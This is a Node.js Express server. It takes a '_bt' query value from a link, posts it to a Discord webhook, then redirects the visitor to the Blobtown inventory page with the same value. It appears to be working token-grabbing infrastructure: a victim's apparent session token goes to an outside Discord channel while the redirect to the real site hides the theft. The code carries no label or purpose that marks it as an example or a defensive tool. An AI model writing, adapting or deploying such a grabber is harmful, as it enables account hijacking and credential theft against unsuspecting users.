'use strict';

const express = require('express');
const helmet = require('helmet');
const { rateLimit } = require('express-rate-limit');

const app = express();
const port = Number(process.env.PORT) || 3000;
const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
const ingestSecret = process.env.INGEST_SECRET;
const blobtownInventoryUrl = 'https://app.blobtown.com/inventory/';

app.set('trust proxy', 1);
app.disable('x-powered-by');
app.use(helmet());
app.use(rateLimit({
  windowMs: 60_000,
  limit: 30,
  standardHeaders: 'draft-8',
  legacyHeaders: false,
}));

app.get('/', (_request, response) => {
  response.status(200).json({ status: 'ok' });
});

app.get('/collect', async (request, response) => {
  if (!discordWebhookUrl) {
    return response.status(503).json({ error: 'Discord webhook is not configured' });
  }

  if (ingestSecret && request.get('x-ingest-secret') !== ingestSecret) {
    return response.status(401).json({ error: 'Unauthorized' });
  }

  if (typeof request.query._bt !== 'string') {
    return response.status(400).json({ error: 'Missing ?_bt= query parameter' });
  }

  const value = request.query._bt.trim();
  if (!value || value.length > 1000) {
    return response.status(400).json({ error: '_bt must be between 1 and 1000 characters' });
  }

  const message = {
    username: 'Render Query Forwarder',
    embeds: [
      {
        title: 'New _bt value',
        color: 0x5865f2,
        fields: [{ name: '_bt', value: `\`${escapeDiscordCode(value)}\`` }],
        timestamp: new Date().toISOString(),
      },
    ],
    allowed_mentions: { parse: [] },
  };

  try {
    const webhookResponse = await fetch(discordWebhookUrl, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(message),
      signal: AbortSignal.timeout(10_000),
    });

    if (!webhookResponse.ok) {
      console.error(`Discord webhook returned HTTP ${webhookResponse.status}`);
      return response.status(502).json({ error: 'Discord rejected the message' });
    }

    const redirectUrl = new URL(blobtownInventoryUrl);
    redirectUrl.searchParams.set('_bt', value);
    return response.redirect(302, redirectUrl.toString());
  } catch (error) {
    console.error('Discord webhook request failed:', error.message);
    return response.status(502).json({ error: 'Could not reach Discord' });
  }
});

function escapeDiscordCode(value) {
  return value.replaceAll('`', '\u02cb');
}

app.listen(port, () => {
  console.log(`Listening on port ${port}`);
});
